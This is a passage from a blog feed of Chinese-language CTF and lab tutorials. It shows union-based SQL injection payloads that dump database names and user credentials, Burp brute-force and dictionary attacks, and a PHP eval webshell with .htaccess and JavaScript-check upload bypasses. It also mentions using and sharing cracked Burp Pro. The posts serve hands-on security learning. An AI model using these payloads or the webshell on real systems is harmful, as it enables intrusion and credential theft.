+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/c4760ee306d81e9264999f2c226015df.png" alt="20180607110003309.png"></p>
+<p>这是网上找的例子,很直观.在实际页面中的截图如下</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/d707e5d6e073063bc0e3c89b74f33de8.png" alt="截图"></p>
+<p>将1改为-1,这样前面id=-1返回flase,会只执行后面union之后的数据</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/7bf275b2be3590c89953b654fce953ac.png" alt="截图"></p>
+<p>可以看出来,我们的回显位是第二、三位.</p>
+<h3 id="五、获取所有数据库名"><a href="#五、获取所有数据库名" class="headerlink" title="五、获取所有数据库名"></a>五、获取所有数据库名</h3><p>基础知识:</p>
+<p>payload:<code>?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</code></p>
+<blockquote>
+<p>information_schema的表schemata中的列schema_name记录了所有数据库的名字</p>
+<p>information_schema的表tables中的列table_schema记录了所有数据库的名字<br>information_schema的表tables中的列table_name记录了所有数据库的表的名字</p>
+<p>information_schema的表columns中的列table_schema记录了所有数据库的名字<br>information_schema的表columns中的列table_name记录了所有数据库的表的名字<br>information_schema的表columns中的列column_name记录了所有数据库的表的列的名字</p>
+</blockquote>
+<p>group_concat():将所有内容变为一行显示</p>
+<p>database():显示当前数据库</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/9258a7c2060e07491f87f34048d92f09.png" alt="截图"></p>
+<h3 id="六、获取所有数据表名"><a href="#六、获取所有数据表名" class="headerlink" title="六、获取所有数据表名"></a>六、获取所有数据表名</h3><p>payload:<code>?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/482ed59e05d7f59d608130509f503b65.png" alt="截图"></p>
+<h3 id="七、获取该表所有字段名"><a href="#七、获取该表所有字段名" class="headerlink" title="七、获取该表所有字段名"></a>七、获取该表所有字段名</h3><p>payload:<code>?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+</code></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/1b52d71ae512b6f2869efde22f1a327a.png" alt="截图"></p>
+<h3 id="八、获取列中的信息"><a href="#八、获取列中的信息" class="headerlink" title="八、获取列中的信息"></a>八、获取列中的信息</h3><p>payload:<code> ?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39; ) --+</code></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/07902accc09af05a98dff2aadbc1795b.png" alt="截图"></p>
+<p>到这里就算结束了,得到了大家的登录信息.</p>
+<h3 id="九、获取需要的记录"><a href="#九、获取需要的记录" class="headerlink" title="九、获取需要的记录"></a>九、获取需要的记录</h3><p><code>?id=-1&#39; union select 1,2,group_concat(username,0x3a,password) from users --+ </code></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/2175f90a9bdca20a73c972c2601b542a.png" alt="截图"></p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/1ebee7665b80e7e43c2495c100fe398b.png" alt="截图"></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/b660e1dcb3fba2aed4874b3a9198faa6.png" alt="截图"></p>
+<p>存在注入点.</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/3376fa0cb38bba31573e9435ff755043.png" alt="截图"></p>
+<p>可以判断出是数字型</p>
+<blockquote>
+<p>//数字型：</p>
+<p>select * from table where id =3</p>
+<p>//字符型：</p>
+<p>select * from table where name=’admin’</p>
+</blockquote>
+<p> 根据这个解释可以比较清楚的知道两者的差别.</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/f4381a292d8e675c4cd104e68bbf8033.png" alt="截图"></p>
+<p>order by 3的时候回显出来正确,可以知道一共有三列.</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/fae68be375ec4e9766214eba70e22a21.png" alt="截图"></p>
+<p>现在就知道了显示位为2,3</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/f47f5650a49f53c05aeae19438a0281f.png" alt="截图"></p>
+<p>得到了所有的数据库名字</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/b5bb175b07ac48c7842e4df18a05a6eb.png" alt="截图"></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/32947b2f75c71f17d3776e79bebe3390.png" alt="截图"></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/501f3dab5a55679e3fb892fe52c70fda.png" alt="截图"></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/2175f90a9bdca20a73c972c2601b542a.png" alt="截图"></p>
+<p>和第一关基本一样,将1’的’去掉即可.后面的题我会省略写,主要写重点</p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/8c489e9369fe1649409c78c40ea2bcd3.png" alt="截图"></p>
+<p>不管是正确还是错误都是返回一样的值,利用单引号测试</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/5c50368192fb5d3df0af27bf5f27249c.png" alt="截图"></p>
+<p>由此我们可以确定SQL后台语句为select * from table where id =(‘input’)</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/a2e63cef3857f326bf623db792c22c47.png" alt="截图"></p>
+<p>其他就和前两个一样了</p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>单引号测试无效,用双引号来测试</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/01f6c44cb4328f5557d8dc90776af51a.png" alt="截图"></p>
+<p>可以知道语句是select * from user where id=(“$id”);</p>
+<p>后面和前三关一模一样.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一些非严肃的文字</title>
+    <url>/2021/11/14/hello-world/</url>
+    <content><![CDATA[<p>欢迎来到我的博客</p>
+<h2 id="关于我为什么要写博客"><a href="#关于我为什么要写博客" class="headerlink" title="关于我为什么要写博客"></a>关于我为什么要写博客</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>   先说好,此博客不是类似我妈妈十年前在写的那种博客,是属于个人博客型的.<br>   你知道的,作为一个喜欢在网上瞎折腾的人总想输出点什么.说到这,我想起我的老爸,他就是输出大师,看了一本书就要感慨一周,看了一部电视剧就要感慨一个月,但由于为人低调,不喜欢发朋友圈;文笔不够,写不出足够的文字来,于是天天对着我和我妈两个人疯狂输出.由于家庭地位的原因,我只能处于被动,但我妈妈就不一样了,可以做出各种反击,并送其外号–”唐僧”.<br>为了不成为第二个唐僧,我不太好向我的女朋友输出这些;发到朋友圈,虽然会有不接触计算机的uu们给予一些赞许,但是无奈专业原因,周围的同学们大多都是比我厉害的,发朋友圈颇有自取其辱的意味了.于是准备自己搭建一个个人网站,做一些个人经历的分享,没准还能给有缘人解决一些问题.</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>   另外,搭建个人博客不像我想象中的那么简单.也可以从中学到很多有用的知识.首先会接触到github,这个可以说是程序员最重要的一个网站了,要在里面创建仓库等等,还得需要用到git,git在如今社会中也有一席之地,属于必备技能之一.<br>   不知查了多少教程,才勉强搭建完毕,发现后面还要美化啊,添加新功能什么的感觉又累又新奇.像我现在在写这篇文章,已经在开始使用markdown语法来写了,也算是一些进步.后期可能会再更新网址什么的,算是一层一层得进步吧.<br>  所以说,学习一些程序员必备的知识也是我搭建博客的一方面.</p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>   从小到大语文在班里都能排得上号,但是自从大学之后,系统看书的时间几乎没有了,平时也不再写东西了,以前高中还会给女朋友写情书,到了大学都变懒了,偶尔写写实验报告,或者cv一下通识课论文啥的.突然感觉自己的语文水平直线下降啊,有时候语言表达能力也退化了,读大段文字都开始有点吃力,更不要说那种严肃文学.<br>   所以,我准备借这个机会,让自己有些阅读别人优秀的博客,吸收一下,也让自己有写作的时间,让自己逻辑能力还有动手能力得到一些提升吧.</p>
+<h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><p>这是我的第一篇博客,就到这里了😀<br>“Hello world”</p>
+]]></content>
+      <categories>
+        <category>不严肃的随笔</category>
+      </categories>
+      <tags>
+        <tag>不严肃的随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于Burp的暴力破解和字典攻击</title>
+    <url>/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为社区版某些功能不太好用,我们就下载了一个专业版,但是专业版需要破解来激活,每次登录都太麻烦了,于是我准备用bat文件做一个快速启动,也不需要重复激活了.</p>
+<h3 id="1-快捷方式创建"><a href="#1-快捷方式创建" class="headerlink" title="1.快捷方式创建"></a>1.快捷方式创建</h3><p>首先将burp还有他的破解的jar包一起放入jdk一个路径下面</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/c0823de49fecc403fa7e870ec721b323.png" alt="截图"></p>
+<p>在文件中输入和我一样的内容,jdk版本和破解用的jar包改成自己的名字即可</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/e15f3e879243b2096fbd31c1f00b14e2.png" alt="截图"></p>
+<p>将txt文件后缀改为bat,点击能看到之前激活码的页面,点击run,就能打开burp专业版的了.</p>
+<h3 id="2-burp暴力破解"><a href="#2-burp暴力破解" class="headerlink" title="2.burp暴力破解"></a>2.burp暴力破解</h3><p>题目地址:</p>
+<p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4920&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4920&amp;page=1</a></p>
+<p>我们这块和题目结合起来:</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/d86256a42efe55a4a1cf4915256179f4.png" alt="截图"></p>
+<p>提示报表中心有被入侵的痕迹,</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/a89b3df51b56b35770c5076e5019099a.png" alt="截图"></p>
+<p>发现不管怎么点都没用,那么应该是对于id进行改变</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/7687d52e55562126060b8f4229088259.png" alt="截图"></p>
+<p>果然,将id=2的时候页面刷新了,虽然没出来flag,只是说明id=2不是正确答案,因此我们需要用到burp暴力破解:</p>
+<p>先按快捷键CTRL+I,发送到intrude,</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/f0dc63b76281981781c8314df77bbb2f.png" alt="截图"></p>
+<p>出现这个页面,用奇怪符合括起来的2就是表示要枚举的数字,我们可以在右边自定义破解的内容.这里的2是系统自己给我们查出来的,我们也确实要枚举这里的id=2,接着我们进行设置</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/a56709883027fe3dae68ab2b5663e0bc.png" alt="截图"></p>
+<p>在这里可以设置线程,我随便将其设置为40,社区版不能设置线程,只能一个一个试,非常慢,比专业版的要慢几十倍;</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/efb4ecfca33b999609a810fd0608c151.png" alt="截图"></p>
+<p>设置枚举范围,我这里选择1-10000,步长为1;</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/75969e394a00f9d52f66f0b6e62276ff.png" alt="截图"></p>
+<p>按下开始按钮,他就开始破解了,我们一路下滑,在id=2333的地方发现有length不一样的地方,查看它</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/dcb3d62e8f725f65672ee0dc6d3119db.png" alt="截图"></p>
+<p>在底下得到了flag;</p>
+<p>这就是暴力破解的全过程,接下来给大家介绍字典破解;</p>
+<h3 id="3-字典破解"><a href="#3-字典破解" class="headerlink" title="3.字典破解"></a>3.字典破解</h3><p>题目地址:</p>
+<p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1</a></p>
+<p>进来什么提示都没有,我们就随便给两个账号密码</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/5c4a06cdb7a77e6f6fabc9aa1cefb97b.png" alt="截图"></p>
+<p>先试试</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/bafc217ff5d70fbc817a78a1d9690546.png" alt="截图"></p>
+<p>提示账号是admin</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/fc6af86490a91fd97bffb5b5b6e25817.png" alt="截图"></p>
+<p>他提示我们使用字典</p>
+<p>常用的字典下载地址:<br><a href="https://github.com/rootphantomer/Blasting_dictionary/blob/master/%E5%B8%B8%E7%94%A8%E5%AF%86%E7%A0%81.txt">https://github.com/rootphantomer/Blasting_dictionary/blob/master/常用密码.txt</a></p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/97754d72a7c4601acd71e768e6865a4e.png" alt="截图"></p>
+<p>发送到intruder,他自动给了我们匹配了两个对象,但是我们由于确定了账号为admin,所以我们将他改为</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/e1db49a6648d660d4acf9d01b0290dbc.png" alt="截图"></p>
+<p>接着我们将攻击模式改为字典</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/0775d1e9587d7cad83c24558d0faf581.png" alt="截图"></p>
+<p>导入之前下载的字典文件</p>
+<p>开始</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/1e543edc985cec4c6253eaca4f5b0129.png" alt="截图"></p>
+<p>这时候就体会出我们专业版的速度了哈,我之前在实验室用社区版慢的要死,现在用新版明显快了很多,接着我们将长度降序排序,发现这个最长的有问题,打开</p>
+<p><img src="/2021/11/24/%E5%85%B3%E4%BA%8Eburp%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%92%8C%E5%AD%97%E5%85%B8%E6%94%BB%E5%87%BB/8c74892ff985c5441f4ce7ff839466cf.png" alt="截图"></p>
+<p>我这里是直接把密码输入进来了,大家也可以直接在burp里面查看.</p>
+<p>这次主要就讲这两个攻击类型,要专业版的安装包的可以加我QQ或者微信.</p>
+]]></content>
+      <categories>
+        <category>工具介绍</category>
+      </categories>
+      <tags>
+        <tag>工具介绍</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞(前端js)</title>
+    <url>/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-js检查"><a href="#文件上传漏洞-js检查" class="headerlink" title="文件上传漏洞(js检查)"></a>文件上传漏洞(js检查)</h1><p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/551e5e41ccbff889fa8bb98ad343f2f8.png" alt="2509712-20211104183800761-251747689.png"></p>
+<p>文件上传有个专门的靶场 – upload-labs.</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/2c352b7e8b25ffe567aff0761a72114c.png" alt="20190619151237843.png"></p>
+<p>这个是网上找来的,是这个靶场的知识点分布.</p>
+<p>今天就介绍一下第一个,js检查.</p>
+<p>小扩展:</p>
+<p>本专题需要了解的一些基础知识有PHP基本语法以及基础的木马写法</p>
+<p>一句话木马:</p>
+<p>写法为<code> &lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></p>
+<p>解析一下:</p>
+<p>1.首先php代码需要写在<?php?>里</p>
+<p>2.@是防止报错的代码,即使执行错误也不报错.如果不带这个@就会因为没有定义变量而被回显报错,你写的木马就会被别的黑客看到,这样人家就可以不劳而获.</p>
+<p>3.eval()把字符串作为PHP代码执行</p>
+<p>4.POST方法,是一种传输数据的方法,实在消息体内存放数据的</p>
+<p><code>$_POST[&#39;a&#39;]; 的意思就是a这个变量，用post的方法接收</code></p>
+<p>现在开始实战</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/17cce08074b1f7152184ab01835c9958.png" alt="截图"></p>
+<p>新建一个php文件,在里面写上木马</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/63360fcedd5c56f7ea4f665d93edc46a.png" alt="截图"></p>
+<p>切记在病毒防护中关了实时保护或者将你的文件夹放到排除项中,否则你写一个木马电脑就删你一个木马.</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/eedf81023c345a5fd180364f4fed8b79.png" alt="截图"></p>
+<p>接着我们按一下检查</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/aded0b8e8254ec6621cbec322dc31bc1.png" alt="截图"></p>
+<p>我们发现了一个方法,checkFile()</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/f36d3d426865ca09107e0da9e8eb526e.png" alt="截图"></p>
+<p>找到发现是一个判断类型的js方法</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/ca99a04d3633ff8f96e51f9565908c4a.png" alt="截图"></p>
+<p>我们将方法删除,这样他就不能利用前端的js方法来判断我们的后缀名是什么了,现在我们就可以上传成功.</p>
+<p>接着,利用中国蚁剑连接刚刚传上去的木马</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/ba7a450f8e097a7370a6243190ef74d5.png" alt="截图"></p>
+<p>复制图像链接,并用自己的post传输的变量作为密码即可连接</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01(%E5%89%8D%E7%AB%AFjs)/5cd739c59b5203412778f8ee06f14c18.png" alt="截图"></p>
+<p>可以在这里找到flag.</p>
+]]></content>
+      <categories>
+        <category>文件上传漏洞</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入判断闭合小技巧</title>
+    <url>/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h1 id="SQL注入判断闭合小技巧"><a href="#SQL注入判断闭合小技巧" class="headerlink" title="SQL注入判断闭合小技巧"></a>SQL注入判断闭合小技巧</h1><p>在前面的联合注入中我讲到过如何判断字符型还是数字型,用的办法是依靠PHP的弱类型来完成判断的,但是这个方法具有一定的局限性,且比较麻烦,需要不停试.</p>
+<p>比如在遇到order by xx的时候,用这种方法就无效了.</p>
+<p>后面我偶然习得一个更好的方法分享给大家:</p>
+<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/eb84da2ec71885274f5817b6b19105d7.png" alt="截图"></p>
+<p>当我输入sort=1’的时候,会有报错’’’出来,三个单引号,第一个和最后一个是系统自带的,提示我们中间的单引号出错了.我们知道,mysql检测是从头到尾顺序检测的,说明我们在这个引号之前都是对的.比如说这一关,我们现在的查询语句为:</p>
+<p><code> order by 1&#39;</code></p>
+<p>他现在只显示’错误,说明前面的order by 1 是正确的语法,说明我们用的就是数字型.</p>
+<p>那如果是字符型呢?</p>
+<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/2c659b53f1b9fde4c89abf377edbae47.png" alt="截图"></p>
+<p>当我输入sort=1’时,它报错’’1’’’,这说明什么,去掉第一个和最后一个,告诉我们’1’’出错了.</p>
+<p>因为我们正确的语句为 order by ‘1’ ,现在变成 order by ‘1’’,而1前面的字符串无法正确闭合,所以会让整体都出错,显示出这个字符串的全部.如果我们在前面加上\符号,那么就会变成</p>
+<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/3063f67ac6aa0d26dfd1be8a836df386.png" alt="截图"></p>
+<p>因为此时的语句为<code>order by &#39;1\&#39;&#39; </code>,单引号经过斜杠的转义,变成了一个字符格式的单引号,现在1前面的单引号就能正确闭合了.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞(上传.htaccess)</title>
+    <url>/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04(%E4%B8%8A%E4%BC%A0.htaccess)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-上传-htaccess"><a href="#文件上传漏洞-上传-htaccess" class="headerlink" title="文件上传漏洞(上传.htaccess)"></a>文件上传漏洞(上传.htaccess)</h1><p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04(%E4%B8%8A%E4%BC%A0.htaccess)/9f88c246089b4fb9521df8a497c1e086.png" alt="截图"></p>
+<p>第四关查看提示,好家伙,这么多黑名单,绕过后缀名肯定是没戏了,那该怎么办呢?</p>
+<p>今天就介绍一个新的文件类型 – .htaccess</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04(%E4%B8%8A%E4%BC%A0.htaccess)/29e45bb904d4213fbb239670a1eb2ac7.png" alt="截图"></p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04(%E4%B8%8A%E4%BC%A0.htaccess)/088515d691c2cd31c7bdbe0e78bbd9ac.png" alt="截图"></p>
+<p>新建一个htaccess文件后,在里面写这三行代码</p>
+<p><code>&lt;FilesMatch &quot;shell&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></p>
+<p>这三行代码的意思是通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含”haha”这个字符串的任意文件，所以无论文件名是什么样子，只要包含”shell”这个字符串，都可以被以 php 的方式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很多上传验证机制的文件后缀名随便写但不可以是黑名单里面的后缀，如shell.jpg</p>
+<p>完整步骤</p>
+<p>1.先将写好的shell.htaccess文件上传</p>
+<p><strong>需要注意的是,上传shell.htaccess的时候需要将名字改为.htaccess</strong></p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04(%E4%B8%8A%E4%BC%A0.htaccess)/2ac94f2a18d28fd217224b5e4c3aa95e.png" alt="截图"></p>
+<p>2.将一句话代码写到shell.php里面</p>
+<p>3.将shell.php上传到网站中,将名字改为shell.jpg,类型改为JPEG的格式,htaccess文件会将其转为shell.php,从而绕过黑名单检测</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04(%E4%B8%8A%E4%BC%A0.htaccess)/6bf86a05fd00575079835920fc7d014b.png" alt="截图"></p>
+<p>4.用中国蚁剑连接,得到flag</p>
+]]></content>
+      <categories>
+        <category>文件上传漏洞</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞(MIME绕过)</title>
+    <url>/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-MIME绕过"><a href="#文件上传漏洞-MIME绕过" class="headerlink" title="文件上传漏洞(MIME绕过)"></a>文件上传漏洞(MIME绕过)</h1><p>小扩展:</p>
+<blockquote>
+<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
+</blockquote>
+<blockquote>
